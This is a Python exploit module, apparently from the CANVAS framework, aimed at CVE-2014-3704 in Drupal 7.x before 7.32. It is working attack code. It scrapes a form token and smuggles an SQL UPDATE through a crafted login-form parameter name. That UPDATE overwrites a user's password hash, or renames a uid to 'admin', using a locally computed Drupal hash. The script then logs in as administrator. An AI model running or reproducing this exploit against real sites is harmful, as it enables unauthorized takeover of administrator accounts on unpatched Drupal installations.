#!/usr/bin/env python

import sys
import os
import time
import re
import urllib
import hashlib
import random

if '.' not in sys.path:
    sys.path.append('.')

import canvasengine

import libs.spkproxy as spkproxy

from exploitutils import *
from libs.canvasos import *
from ExploitTypes.php_multi import *

NAME                           = 'Drupal injection exploit'
DESCRIPTION                    = ("This exploit leverages a vulnerability in Drupal's database abstraction api that allows an " +
                                  "attacker to send specially crafted requests resulting in arbitrary SQL execution.")
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'drupal.org'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2014-3704'
DOCUMENTATION['CVE Url']       = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704'

VERSION                        = '0.1'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Web Exploits'
PROPERTY['SITE']               = 'Remote'
PROPERTY['ARCH']               = [["Linux" ] , ["Windows"]]
PROPERTY['VERSION']            = ["7.x < 7.32"]
DOCUMENTATION["References"]    = ["https://www.drupal.org/SA-CORE-2014-005"]
DOCUMENTATION['Notes']         = """

This exploit replaces the password of 'Drupal User' with 'Drupal Password'.
If uid is specified, 'Drupal User' is ignored.
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port               = 80
        self.host               = ""
        self.ssl                = ""
        self.name               = NAME
        self.basepath           = ""
        self.basepaths          = []
        #self.command           = None
        self.basicauth_user     = ""
        self.basicauth_password = ""
        self.hostname           = None
        self.foundstrings       = ["Drupal"]
        self.testfile           = "index.php"

        self.payload            = ""

        self.drupal_user        = ""
        self.drupal_pass        = "" # "Temporary.$Passw0rd"
        self.drupal_uid         = ""

        self.form_build_id      = None

        self.itoa64 = './0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'


    def neededListenerTypes(self):
        return []

    def getargs(self):
        """
        Get arguments for attack.
        """
        php_multi.getargs(self)

        self.getarg("host")
        self.getarg("port")
        self.getarg("basepath")
        self.getarg("basicauth_user")
        self.getarg("basicauth_password")
        self.getarg("ssl")

        self.hostname = self.argsDict.get('vhost')

        self.getarg("drupal_user")
        self.getarg("drupal_pass")
        self.getarg("drupal_uid")

        self.basepaths = [self.basepath]

    def b64encode(self, string):
        count = len(string)

        output = ''
        i = 0

        while 1:
            value = ord(string[i])
            i += 1
            output += self.itoa64[value & 0x3f]
            if i < count:
                value |= ord(string[i]) << 8
            output += self.itoa64[(value >> 6) & 0x3f]
            if i >= count:
                break
            i += 1
            if i < count:
                value |= ord(string[i]) << 16
            output += self.itoa64[(value >> 12) & 0x3f]
            if i >= count:
                break
            i += 1
            output += self.itoa64[(value >> 18) & 0x3f]
            if i >= count:
                break

        return output

    def get_hash(self, password):
        version = "$S$"      # drupal 7
        rounds  = "D"        # 15 rounds
        salt    = "Iq7PIKOK" # salt

        cur_hash = hashlib.sha512(salt + password).digest()
        for i in xrange(2**15):
            cur_hash = hashlib.sha512(cur_hash + password).digest()

        return (version + rounds + salt + self.b64encode(cur_hash))[:55]

    def get_form_build_id(self, data):
        matches = re.findall("form_build_id\"\s+value=\"([^\"]+)\"", data)
        if len(matches):
            return matches[0]
        else:
            return None

    def request1(self):

        self.log("[+] Requesting form data")
        data = self.UA.GET("")

        self.form_build_id = self.get_form_build_id(data)
        if not self.form_build_id:
            self.log("[EE] New form_build_id not found")
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        return True

    def request2(self):
        self.log("[+] Triggering")

        payload = "update users set pass='%s' where name='%s';--" % (self.get_hash(self.drupal_pass), self.drupal_user)
        if self.drupal_uid:
            payload = "update users set name='admin',pass='%s' where uid='%s';--" % (self.get_hash(self.drupal_pass), self.drupal_uid)


        post_data = ("name[user;%s]=user" % urllib.quote_plus(payload, safe="';,/$"),
                     "name[user]=user",
                     "pass=pass",
                     "form_build_id=%s" % self.form_build_id,
                     "form_id=user_login_block",
                     urllib.quote_plus("op=Log in", safe="=")
                    )

        data = self.UA.POST("?q=node&destination=node", data="&".join(post_data) )

        self.form_build_id = self.get_form_build_id(data)
        if not self.form_build_id:
            self.log("[EE] New form_build_id not found")
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        return True

    def request3(self):
        self.log("[+] Logging In")

        post_data = ("name=admin",
                     "pass=%s" % urllib.quote_plus(self.drupal_pass),
                     "form_build_id=%s" % self.form_build_id,
                     "form_id=user_login_block",
                     urllib.quote_plus("op=Log in", safe="=")
                    )

        data = self.UA.POST("?q=node&destination=node", data="&".join(post_data) )

        if len(re.findall("value=\"user_login_block\"", data)):
            self.log("[EE] Admin login failed")
            self.setInfo("%s attacking %s - done (failed)" % (NAME, self.host))
            return 0

        self.log("[+] Succeeded")
        self.setSucceeded()
        self.setInfo("%s attacking %s - done (success!)" % (NAME, self.host))
        return True



if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
